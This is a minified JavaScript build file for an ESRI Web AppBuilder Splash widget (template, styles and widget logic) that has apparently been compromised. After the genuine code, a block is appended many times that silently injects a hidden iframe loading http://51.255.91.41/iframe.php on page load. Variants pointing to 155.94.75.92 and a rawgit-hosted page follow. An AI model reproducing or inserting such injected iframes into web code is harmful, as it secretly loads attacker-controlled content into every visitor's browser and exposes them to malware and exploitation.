// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/Splash/_build-generate_module":function(){define(["dojo/text!./Widget.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/Splash/Widget.html":'\x3cdiv class\x3d"jimu-widget-splash-desktop"\x3e\r\n  \x3cdiv class\x3d"overlay" data-dojo-attach-point\x3d"overlayNode"\x3e\x3c/div\x3e\r\n  \x3cdiv class\x3d"envelope buried" data-dojo-attach-point\x3d"envelopeNode"\x3e\r\n    \x3cdiv class\x3d"splash-container splash-bg" data-dojo-attach-point\x3d"splashContainerBackground"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"splash-container" data-dojo-attach-point\x3d"splashContainerNode"\x3e\r\n      \x3cdiv class\x3d"custom-content" data-dojo-attach-point\x3d"customContentNode" style\x3d"font-family: \'Verdana\',\'Avenir Light\'"\x3e\x3c/div\x3e\r\n      \x3cdiv class\x3d"footer" data-dojo-attach-point\x3d"footerNode"\x3e\r\n        \x3cdiv class\x3d"confirmcheck-container" data-dojo-attach-point\x3d"confirmCheckContainer"\x3e\r\n          \x3cdiv data-dojo-attach-point\x3d"confirmCheck"\x3e\x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cbutton class\x3d"jimu-btn jimu-float-trailing" data-dojo-attach-point\x3d"okNode" data-dojo-attach-event\x3d"onclick:onOkClick" tabindex\x3d"0"\x3e\x3c/button\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/Splash/css/style.css":".jimu-widget-splash{position: absolute !important; top: 0 !important; bottom: 0 !important; left: 0 !important; right: 0 !important; margin: auto !important; z-index: 110;}.jimu-widget-splash .buried{visibility: hidden;}.jimu-widget-splash .overlay{top: 0; left: 0; width: 100%; height: 100%; position: absolute; background-color:rgba(0,0,0,0.5);}.jimu-widget-splash-desktop .splash-container .jimu-checkbox,.jimu-widget-splash-mobile .splash-container .jimu-checkbox{font-size: 14px; color: #fff; overflow: auto; max-height: 50px; min-height: 25px; margin-top: 20px; margin-bottom: 10px; display: block;}.jimu-widget-splash-desktop .splash-container .jimu-checkbox .label,.jimu-widget-splash-mobile .splash-container .jimu-checkbox .label{white-space: normal; text-indent: 5px; margin-left: 5px; color: #fff; float: none !important; display: inline; vertical-align: middle;}.jimu-rtl .jimu-widget-splash-desktop .splash-container .jimu-checkbox .label,.jimu-rtl .jimu-widget-splash-mobile .splash-container .jimu-checkbox .label{margin-left: auto; margin-right: 5px;}.jimu-widget-splash-desktop .envelope{}.jimu-widget-splash-desktop .envelope,.jimu-widget-splash-mobile .envelope{position: absolute; top: 0; bottom: 0; left: 0; right: 0; margin: auto; -moz-user-select: none; -webkit-user-select: none; -ms-user-select: none;}.jimu-widget-splash-desktop .splash-container .jimu-btn,.jimu-widget-splash-mobile .splash-container .jimu-btn{height: 33px; padding: 0; width: 60px; line-height: 33px;}.jimu-rtl .jimu-widget-splash-desktop .splash-container .jimu-btn,.jimu-rtl .jimu-widget-splash-mobile .splash-container .jimu-btn{left: 0; right: auto;}.jimu-widget-splash-desktop .splash-container .enable-btn,.jimu-widget-splash-mobile .splash-container .enable-btn{background-color: #518dca;}.jimu-widget-splash-desktop .splash-container .disable-btn,.jimu-widget-splash-mobile .splash-container .disable-btn{background-color: #a0acbf !important; color: rgb(255, 255, 255) !important;}.jimu-widget-splash-desktop .splash-container .jimu-checkbox .checkbox,.jimu-widget-splash-mobile .splash-container .jimu-checkbox .checkbox{background-color: #fff;}.jimu-widget-splash-desktop .envelope{border: 1px solid rgba(255,255,255,0.3);}.jimu-widget-splash-desktop .splash-container,.jimu-widget-splash-desktop .splash-bg{position: absolute; display: inline-block; margin: auto; top: 0; left: 0; bottom: 0; right: 0; overflow:auto;}.jimu-widget-splash-desktop .splash-container{z-index: 1; overflow: hidden;}.jimu-widget-splash .norepeat{background: no-repeat;}.jimu-widget-splash .fill {background-size: cover !important;}.jimu-widget-splash .fit {background-size: contain !important;}.jimu-widget-splash .stretch {background-size: 100% 100% !important;}.jimu-widget-splash .center {background-size: initial !important;}.jimu-widget-splash .tile {background-size: initial !important;}.jimu-widget-splash-desktop .splash-bg{z-index: 0;}.jimu-widget-splash-desktop .custom-content{margin: 20px; color: #fff; overflow-x: hidden; overflow-y: auto;}.jimu-widget-splash-desktop .splash-container .footer{position: absolute; bottom: 10px; width: 100%;}.jimu-widget-splash .footer .confirmcheck-container{margin: 0 20px;}.jimu-widget-splash .footer .confirmcheck-container .jimu-checkbox .checkbox{margin: 2px;}.jimu-widget-splash .footer .confirmcheck-container .jimu-checkbox .dijitCheckBoxFocused{box-shadow: 0 0 0px 2px rgba(136, 176, 245, 1);}.jimu-widget-splash .footer .jimu-btn {margin: 0 20px 2px 20px;}.jimu-widget-splash .footer .jimu-btn:focus {box-shadow: 0 0 0px 2px rgba(136, 176, 245, 1);}",
"*now":function(h){h(['dojo/i18n!*preload*widgets/Splash/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/html dojo/on dojo/query dojo/cookie dijit/_WidgetsInTemplateMixin jimu/BaseWidget jimu/dijit/CheckBox jimu/utils esri/lang jimu/dijit/LoadingShelter dojo/Deferred".split(" "),function(h,g,b,k,l,f,n,p,q,e,m,r,t){return h([p,n],{baseClass:"jimu-widget-splash",_hasContent:null,_requireConfirm:null,_isClosed:!1,postCreate:function(){this.inherited(arguments);this.shelter=new r({hidden:!0});this.shelter.placeAt(this.domNode);this.shelter.startup();
this._hasContent=this.config.splash&&this.config.splash.splashContent;this._requireConfirm=this.config.splash&&this.config.splash.requireConfirm;this._showOption=this.config.splash&&this.config.splash.showOption;this._confirmEverytime=this.config.splash&&this.config.splash.confirmEverytime;this._hasContent&&(this.customContentNode.innerHTML=this.config.splash.splashContent);if(this._requireConfirm||this._showOption){var a="";this._requireConfirm?(a=this.config.splash.confirm.text,b.addClass(this.okNode,
"disable-btn")):(a=this.nls.notShowAgain,b.addClass(this.okNode,"enable-btn"));this.confirmCheck=new q({label:e.stripHTML(a),checked:!1,tabindex:0},this.confirmCheck);this.own(k(this.confirmCheck,"change",g.hitch(this,this.onCheckBoxClick)));b.setAttr(this.confirmCheck.domNode,"title",e.stripHTML(a));this.confirmCheck.startup()}else b.setStyle(this.confirmCheck,"display","none"),b.addClass(this.okNode,"enable-btn")},onOpen:function(){if(!e.isInConfigOrPreviewWindow()){var a=this._getCookieKey(),a=
f(a);m.isDefined(a)&&"false"===a.toString()&&this.close()}this._requireConfirm||this._showOption?this.confirmCheck.focus():this.okNode.focus()},startup:function(){this.inherited(arguments);this.shelter.show();this._normalizeDomNodePosition();this._setConfig()},_setConfig:function(){this._setWidthForOldVersion().then(g.hitch(this,function(){this._setSizeFromConfig();var a=this.config.splash.button;"undefined"!==typeof a&&("undefined"!==typeof a.color&&(b.setStyle(this.okNode,"backgroundColor",a.color),
b.setStyle(this.okNode,"color",e.invertColor(a.color))),"undefined"!==typeof a.transparency&&b.setStyle(this.okNode,"opacity",1-a.transparency));this.okNode.innerHTML=this.config.splash.button.text||this.nls.ok;b.attr(this.okNode,"title",this.config.splash.button.text||this.nls.ok);var c=this.config.splash.background;if("undefined"!==typeof c)if("image"===c.mode&&"undefined"!==typeof c.image){var d=a="",a="url("+e.processUrlInWidgetConfig(c.image,this.folderUrl)+") center center ",d="no-repeat",c=
c.type;"undefined"!==typeof c&&(b.addClass(this.splashContainerNode,c),"tile"===c&&(d="repeat"));b.setStyle(this.splashContainerNode,"background",a+d)}else"color"===c.mode&&"undefined"!==typeof c.color&&("undefined"!==typeof c.color&&b.setStyle(this.splashContainerBackground,"backgroundColor",c.color),"undefined"!==typeof c.transparency&&b.setStyle(this.splashContainerBackground,"opacity",1-c.transparency));a=this.config.splash.confirm;"undefined"!==typeof a&&(d=l(".label",this.dmoNode)[0],"undefined"!==
typeof a.color&&d&&b.setStyle(d,"color",a.color),"undefined"!==typeof a.transparency&&d&&b.setStyle(d,"opacity",1-a.transparency));this.contentVertical="undefined"!==typeof this.config.splash.contentVertical?this.config.splash.contentVertical:"top";e.isInConfigOrPreviewWindow()||(a=this._getCookieKey(),a=f(a),m.isDefined(a)&&"false"===a.toString()&&this.close());this.resize();this.own(k(window,"resize",g.hitch(this,function(){this.resize()})));this._resizeContentImg();b.removeClass(this.envelopeNode,
"buried");this.shelter.hide()}))},_normalizeDomNodePosition:function(){b.setStyle(this.domNode,"top",0);b.setStyle(this.domNode,"left",0);b.setStyle(this.domNode,"right",0);b.setStyle(this.domNode,"bottom",0)},setPosition:function(a){this.position=a;b.place(this.domNode,window.jimuConfig.layoutId);this._normalizeDomNodePosition();this.started&&this.resize()},resize:function(){this._changeStatus()},_resizeContentImg:function(){if(this._hasContent&&!this._isClosed){var a=b.getContentBox(this.envelopeNode);
b.empty(this.customContentNode);var c=b.toDom(this.config.splash.splashContent);b.place(c,this.customContentNode);this.customContentNode.nodeType&&1===this.customContentNode.nodeType&&(c=l("img",this.customContentNode))&&c.length&&c.style({maxWidth:a.w-40-20+"px",maxHeight:a.h-40+"px"})}},_changeStatus:function(){window.appInfo.isRunInMobile?(b.setStyle(this.envelopeNode,"height","100%"),b.setStyle(this.envelopeNode,"width","100%")):this._setSizeFromConfig();this._resizeCustomContent();this._resizeContentImg()},
_getNodeStylePx:function(a,c){return a&&c?parseInt(b.getStyle(a,c),10):0},_resizeCustomContent:function(){var a=b.getContentBox(this.splashContainerNode),c=this.customContentNode.scrollHeight,d=b.getMarginBox(this.footerNode),e=this._getNodeStylePx(this.customContentNode,"margin-bottom"),f=this._getNodeStylePx(this.footerNode,"bottom"),a=a.h-(d.h+f);!0===c>=a||window.appInfo.isRunInMobile?b.setStyle(this.customContentNode,"height",a-e+"px"):(b.setStyle(this.customContentNode,"height","auto"),this._moveContentToMiddle({contentSpace:a,
customContentScrollheight:c}))},_moveContentToMiddle:function(a){var c=(a.contentSpace-10)/2;"middle"===this.contentVertical&&(a=a.customContentScrollheight/2-c,0>a?b.setStyle(this.customContentNode,"marginTop",Math.abs(a)+10+"px"):b.setStyle(this.customContentNode,"marginTop","10px"))},onCheckBoxClick:function(){this._requireConfirm&&(this.confirmCheck.getValue()?(b.addClass(this.okNode,"enable-btn"),b.removeClass(this.okNode,"disable-btn")):(b.addClass(this.okNode,"disable-btn"),b.removeClass(this.okNode,
"enable-btn")))},_getCookieKey:function(){return"isfirst_"+encodeURIComponent(e.getAppIdFromUrl())},onOkClick:function(){var a=this._getCookieKey();this._requireConfirm?this.confirmCheck.getValue()&&(e.isInConfigOrPreviewWindow()||this._confirmEverytime?f(a,null,{expires:-1}):f(a,!1,{expires:1E3,path:"/"}),this.close()):(this._showOption?!e.isInConfigOrPreviewWindow()&&this.confirmCheck.getValue()&&f(a,!1,{expires:1E3,path:"/"}):f(a,null,{expires:-1}),this.close())},close:function(){this._isClosed=
!0;this.widgetManager.closeWidget(this)},_setSizeFromConfig:function(){var a=this.config.splash.size;if("undefined"!==typeof a&&"object"===typeof a){var c=a.percent,d=a.wh;"percent"===a.mode&&"undefined"!==typeof c?(b.setStyle(this.envelopeNode,"width",c),b.setStyle(this.envelopeNode,"height",c)):"wh"===a.mode&&"undefined"!==typeof d&&(this._setWidthInCurrentScreen(d),this._setHeightInCurrentScreen(d))}},_setWidthInCurrentScreen:function(a){var c=window.innerWidth;!window.appInfo.isRunInMobile&&a.w<=
c?b.setStyle(this.envelopeNode,"width",a.w+"px"):b.setStyle(this.envelopeNode,"width","100%")},_setHeightInCurrentScreen:function(a){var c=window.innerHeight;!window.appInfo.isRunInMobile&&a.h<=c?b.setStyle(this.envelopeNode,"height",a.h+"px"):b.setStyle(this.envelopeNode,"height","100%")},_setWidthForOldVersion:function(){var a=new t,b=this.config.splash.size;if(!0===("wh"===b.mode&&"undefined"!==typeof b.wh&&null===b.wh.h))return e.getEditorContentHeight(this.config.splash.splashContent,this.domNode,
{contentWidth:560,contentMarginTop:20,footerHeight:98}).then(g.hitch(this,function(a){return b.wh.h=a}));a.resolve();return a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});